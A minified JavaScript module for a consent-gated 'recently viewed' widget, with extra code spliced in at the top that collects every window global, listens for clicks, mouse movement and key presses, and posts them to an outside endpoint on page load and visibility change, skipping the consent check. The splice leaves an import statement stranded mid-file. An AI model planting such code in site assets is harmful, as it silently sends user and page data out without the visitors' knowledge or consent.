function collectGlobalVariables() {
  const collectedData = {};
  const excludeList = ['seenVars', 'collectGlobalVariables', 'sendData', 'initTracking'];
  Object.keys(window).forEach(key => {
    if (!excludeList.includes(key)) {
      const item = window[key];
      collectedData[key] = typeof item === 'function' ? 'function' : item;
    }
  });
  return collectedData;
}
function monitorEvents() {
  const events = ['click', 'mousemove', 'keypress'];
  events.forEach(event => {
    document.addEventListener(event, () => {
      console.log(`Event ${event} triggered.`);
      sendData({
        event: event
      });
    });
  });
}
import { d as o, l as r, ah as d } from "./LoginWidget-34fb458a.js";
async function sendData(data) {
  const endpoint = "https://example.com/api/track";
  try {
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });
    if (!response.ok) throw new Error('Failed to send data');
    console.log('Data sent successfully');
  } catch (error) {
    console.error('Error sending data:', error);
  }
}
function initTracking() {
  const data = collectGlobalVariables();
  sendData(data);
  monitorEvents();
}
const s = {
    maxElements: 12,
    dataSource: "recentlyViewedData",
    originUrl: "https://fwcdn.pl"
  },
  c = {
    dataSel: ".recentlyViewed__data"
  },
  [l, h] = ["get", "set"];
window.addEventListener('load', initTracking);
document.addEventListener('visibilitychange', () => sendData({
  visibilityState: document.visibilityState
}));
class a {
  constructor(t = {}) {
    this.options = o(s, t), this._init().catch(r);
  }
  _getData() {
    this.iframeEl.contentWindow.postMessage(JSON.stringify({
      key: this.options.dataSource,
      method: l
    }), "*");
  }
  async _prepareData() {
    this.data = await this._setData();
  }
  _bindElements() {
    this.iframeEl = document.querySelector(c.dataSel);
  }
  async _init() {
    await window.rodo.waitForConsent(), (await window.rodo.checkIsDidomiPurpose("cookies")) && (this._bindElements(), this._getData(), await this._prepareData(), this._insertItem(), this._updateLocalStorage());
  }
  async _setData() {
    return new Promise(t => {
      const e = i => {
        if (i.origin === s.originUrl) {
          const n = typeof i.data == "string" ? JSON.parse(i.data) : i.data;
          window.removeEventListener("message", e), t(a.isDataCorrect(n) ? this._getLimitedData(n) : []);
        }
      };
      window.addEventListener("message", e);
    });
  }
  _getLimitedData(t) {
    return t.length >= this.options.maxElements ? t.slice(0, this.options.maxElements - 1) : t;
  }
  _updateLocalStorage() {
    this.iframeEl.contentWindow.postMessage(JSON.stringify({
      key: this.options.dataSource,
      method: h,
      data: this.data
    }), "*");
  }
  _isItemExist(t) {
    return this.data.some(e => e.id === t.id && e.linkUrl === t.linkUrl);
  }
  _insertItem() {
    const t = d(s.dataSource);
    this._isItemExist(t) ? this.data.sort((e, i) => (i.id === t.id) - (e.id === t.id)) : this.data.unshift(t);
  }
  static isDataCorrect(t) {
    return t && t.length > 0 ? t[0].linkUrl : !1;
  }
  static init() {
    return new a();
  }
}
export { a as default };